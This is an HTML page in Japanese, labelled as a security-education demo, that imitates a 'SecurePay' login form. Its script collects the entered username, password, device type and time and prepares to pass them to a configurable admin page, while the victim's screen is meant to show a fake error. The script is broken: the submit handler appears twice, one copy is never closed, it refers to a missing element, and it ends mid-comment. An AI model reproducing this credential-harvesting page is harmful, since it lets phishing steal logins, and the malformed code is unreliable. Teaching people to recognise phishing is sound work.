<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ログイン | セキュリティ確認（デモ）</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="victim-body">
  
  <div class="demo-warning">
    🚨 ［セキュリティ学習用デモ］これは教育目的の擬似サイトです。
  </div>

  <div class="login-container" id="login-box">
    <div class="mock-logo">
      <span class="logo-icon">🛡️ S</span>
      <span>SecurePay</span>
    </div>

    <h2>アカウントログイン</h2>
    <p class="subtitle">サービスをご利用いただくにはログインが必要です</p>
    
    <form id="login-form">
      <div class="input-group">
        <label>ユーザーID / メールアドレス</label>
        <input type="text" id="username" placeholder="example@email.com" required>
      </div>
      <div class="input-group">
        <label>パスワード</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>
      <button type="submit" id="login-btn" class="btn-primary">ログイン</button>
    </form>
  </div>

 <script>
    const urlParams = new URLSearchParams(window.location.search);
    const adminUrl = urlParams.get('admin') || 'admin.html';

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      if (ua.includes("iPhone")) return "iPhone (iOS)";
      if (ua.includes("iPad")) return "iPad (iOS)";
      if (ua.includes("Android")) return "Androidスマホ";
      if (ua.includes("Windows")) return "Windows PC";
      if (ua.includes("Mac")) return "Mac PC";
      return "不明な端末";
    }

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      const params = new URLSearchParams({
        time: time,
        device: device,
        username: username,
        password: password
      });

      // 1. スマホ側には「メンテナンスエラー画面」を表示して、ログイン画面を隠す
      document.getElementById('login-box').classList.add('hidden');
      document.getElementById('error-box').classList.remove('hidden');

      // 2. 裏側（バックグラウンド）で、PC側の管理画面にデータを送って開く（またはリダイレクトさせる）
      // ※本番のデモのときは、プロジェクターに映っているPC画面側でこのデータを受け取る形になります
  



    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const device = getDeviceInfo();
      const time = new Date().toLocaleTimeString();

      // 入力されたデータをURLのパラメータにエンコード
      const params = new URLSearchParams({
        time: time,
        device: device,
        username: username,
        password: password
      });

      // 🌐 【超確実な仕組み】
      // スマホの画面を、PC側の管理画面（データを受け取るモード）へ強制的にワープさせる！
      // ※もし本番でPC画面に直接反映させたい場合は、あらかじめPC側でこのadmin.htmlを開いておき、
      // 　ス
  </script>
</body>
</html>
